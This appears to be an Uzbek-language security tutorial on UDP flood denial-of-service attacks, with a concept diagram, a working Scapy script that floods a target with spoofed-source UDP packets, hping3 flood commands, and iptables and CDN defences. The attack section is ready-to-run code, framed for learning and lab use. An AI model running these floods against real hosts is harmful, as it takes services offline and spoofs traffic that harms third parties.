# UDP Flood

Ko'p UDP paketlar yuborib server bandwidth yoki CPU'sini tugatish hujumi.

---

## Tushuntirish

```text
Normal UDP:
Client → UDP → Server
Server → UDP Reply → Client

UDP Flood:
Bot 1 → UDP → Server
Bot 2 → UDP → Server
Bot 3 → UDP → Server
... (minglab UDP paketlar)
Server: Bandwidth to'ldi ❌
```

---

## ⚠️ Ogohlantirish

**Faqat o'z tarmog'ingizda sinang!**

---

## Amaliy hujum (o'rganish uchun)

### Scapy yordamida UDP Flood

```python
from scapy.all import *
import random
import os

def udp_flood(target_ip, target_port, count=1000):
    """UDP Flood - faqat o'z tarmog'ingizda sinang!"""
    
    print(f"[*] UDP Flood boshlandi: {target_ip}:{target_port}")
    print(f"[*] {count} ta paket yuboriladi")
    
    sent = 0
    for i in range(count):
        try:
            # Tasodifiy manzil
            src_ip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
            
            # UDP paket
            ip_layer = IP(src=src_ip, dst=target_ip)
            udp_layer = UDP(
                sport=random.randint(1024, 65535),
                dport=target_port
            )
            payload = Raw(load=os.urandom(1024))
            
            send(ip_layer/udp_layer/payload, verbose=False)
            sent += 1
            
            if sent % 100 == 0:
                print(f"[*] Sent {sent}/{count}")
                
        except KeyboardInterrupt:
            break
    
    print(f"[*] Tugadi. Jami: {sent} paket")

# Ishlatish (faqat o'z tarmog'ingizda!)
# udp_flood("192.168.1.100", 53, 100)
```

### hping3 yordamida

```bash
# UDP flood
sudo hping3 --udp -p 53 --flood 192.168.1.100

# DNS port ga UDP flood
sudo hping3 --udp -p 53 -d 1024 --flood 192.168.1.100
```

---

## Himoya

### 1. Rate Limiting

```bash
# iptables
sudo iptables -A INPUT -p udp -m limit --limit 100/s --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p udp -j DROP
```

### 2. Firewall

```bash
# Kerakli UDP portlarni ochish, qolganini bloklash
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT  # DNS
sudo iptables -A INPUT -p udp --dport 123 -j ACCEPT # NTP
sudo iptables -A INPUT -p udp -j DROP
```

### 3. CDN

```text
CDN (Cloudflare, AWS Shield):
- Trafikni so'raydi
- DDoS ni to'xtatadi
- Faqat to'g'ri trafikni o'tkazadi
```

---

## Xulosa

- UDP Flood bandwidth ni tugatadi
- UDP connectionless, shuning uchun juda tez
- Rate Limiting, Firewall, CDN bilan himoya
